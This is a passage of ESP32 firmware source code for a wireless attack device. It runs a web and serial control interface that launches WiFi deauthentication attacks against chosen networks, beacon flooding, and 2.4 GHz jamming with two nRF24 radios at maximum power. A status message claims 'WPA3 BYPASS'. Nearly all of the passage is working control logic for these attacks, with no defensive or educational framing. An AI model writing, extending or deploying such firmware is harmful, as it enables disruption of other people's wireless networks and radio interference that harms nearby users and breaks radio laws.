void handleScan(){
  if(isJamming)stopJamming();if(isBeaconing)stopBeaconFlood();
  startWiFiScan();
  server.sendHeader("Location","/",true);server.send(302);
}
void handleDeauth(){
  String i=server.arg("idx");
  if(i=="stop")stopDeauth();
  else{int x=i.toInt();if(isJamming){stopJamming();isJamming=false;}if(isBeaconing)stopBeaconFlood();startDeauth(x);}
  server.sendHeader("Location","/",true);server.send(302);
}
void handleBeacon(){
  String a=server.arg("action");
  if(a=="start"){if(isJamming){stopJamming();isJamming=false;}if(isDeauthing)stopDeauth();startBeaconFlood();}
  else stopBeaconFlood();
  server.sendHeader("Location","/",true);server.send(302);
}
void handleRFToggle(){
  String t=server.arg("time");int s=t.toInt();
  if(s>=0){if(isDeauthing)stopDeauth();if(isBeaconing)stopBeaconFlood();isJamming=true;startJamming();if(s>0){isWebRfJamming=true;currentWebJamDuration=s*1000;rfJamStartTime=millis();}else isWebRfJamming=false;}
  server.send(200,"text/plain","OK");
}
void handleSerial(){
  if(Serial.available()){
    String c=Serial.readStringUntil('\n');c.trim();
    if(c.equalsIgnoreCase("scan")){if(isJamming)stopJamming();if(isBeaconing)stopBeaconFlood();startWiFiScan();}
    else if(c.startsWith("deauth ")){String a=c.substring(7);if(a=="off")stopDeauth();else{if(isJamming)stopJamming();if(isBeaconing)stopBeaconFlood();startDeauth(a.toInt());}}
    else if(c.equalsIgnoreCase("rf"))toggleJammerPhysical();
    else if(c.equalsIgnoreCase("beacon")){if(isBeaconing)stopBeaconFlood();else startBeaconFlood();}
  }
}

// ===== INIT =====
void initRF24Configs(){
  radio.setAutoAck(false);radio.stopListening();radio.setRetries(0,0);
  radio.setPALevel(RF24_PA_MAX,true);radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio1.setAutoAck(false);radio1.stopListening();radio1.setRetries(0,0);
  radio1.setPALevel(RF24_PA_MAX,true);radio1.setDataRate(RF24_2MBPS);
  radio1.setCRCLength(RF24_CRC_DISABLED);
}
void initSP(){sp=new SPIClass(VSPI);sp->begin(18,19,23,21);if(radio1.begin(sp)){initRF24Configs();radio1.powerDown();}}
void initHP(){hp=new SPIClass(HSPI);hp->begin(14,12,13,15);if(radio.begin(hp)){initRF24Configs();radio.powerDown();}}

void setup(){
  Serial.begin(115200);delay(1000);setCpuFrequencyMhz(240);
  pinMode(rfButtonPin,INPUT_PULLUP);pinMode(rfLedPin,OUTPUT);digitalWrite(rfLedPin,LOW);
  pinMode(deauthButtonPin,INPUT_PULLUP);pinMode(deauthLedPin,OUTPUT);digitalWrite(deauthLedPin,LOW);
  esp_wifi_set_max_tx_power(84);initHP();initSP();
  WiFi.mode(WIFI_AP);WiFi.softAP(apSSID,apPassword,1,0,4);
  server.on("/",handleRoot);server.on("/scan",handleScan);server.on("/deauth",handleDeauth);
  server.on("/beacon",handleBeacon);server.on("/rf",handleRFToggle);
  server.begin();
  Serial.println("[*] System Ready - WPA3 BYPASS + Client Counting");
}

void loop(){
  checkDeauthButton();checkJammerButton();
  if(isBeaconing){server.handleClient();handleSerial();esp_wifi_set_channel(currentBeaconChannel,WIFI_SECOND_CHAN_NONE);for(int i=0;i<30;i++)sendBeacon(currentBeaconChannel);currentBeaconChannel++;if(currentBeaconChannel>13)currentBeaconChannel=1;yield();}
  else if(isJamming){checkJammerButton();if(isWebRfJamming&&millis()-rfJamStartTime>=currentWebJamDuration){isJamming=false;stopJamming();}else aggressiveRandomMode();}
  else{server.handleClient();handleSerial();checkJammerButton();checkDeauthButton();if(isDeauthing){sendPowerfulDeauth();delay(1);yield();}}
}
